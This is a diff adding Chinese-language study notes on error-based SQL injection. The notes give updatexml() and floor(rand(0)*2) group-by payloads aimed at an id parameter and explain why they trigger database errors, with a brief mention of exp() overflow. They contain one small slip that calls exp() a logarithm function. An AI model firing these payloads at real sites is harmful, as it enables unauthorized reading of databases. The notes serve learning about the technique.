@@ -83,3 +83,14 @@ SQL注入类型：数字和字符型 表中存在id字段的才可以使用，�
  2.updatexml
  and 1=(updatexml(1,concat(0x7e,(sql_inject)),1))
 这个函数用来更新xml数据的，但是我们非法传参，使它故意报错，执行我们的sql语句，0x7e是~用来区分数据
+报错的floor():and select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)
+原理分析floor()
+rand()随机产生0-1数，加参数固定值，count(*)计算有多少列，group by分组，虚拟表：没有插入操作加一,floor()向下取整，通过floor(rand(0)*2)结果只有0和1，select count*,floor
+(rand(0)*2) from floortest group by floor当执行插入操作的时候rand(0)又被执行一次，operand should contain 1columns操作数应该包含一列，select count(*),floor(rand(0)*2)x from information_schema.tables查询出来的是一个结果表 要为布尔值所以select 1
+every derived table must have its own alias每个派生表必须有自己的别名：id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x))改为id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
+duplicate entry重复的条目
+如何floor联合报错的：进行group by floor(rand(0)*2),floor表达式第一次运算的值为0，在插入的过程中需要再取一次group by后面的值，取到1并插入 注意：语法顺序
+double数值类型溢出原理
+%2b=+,exp与in和log的功能相反，指数函数为对数函数的反函数，exp()即为e为底的对数函数
+
+ 
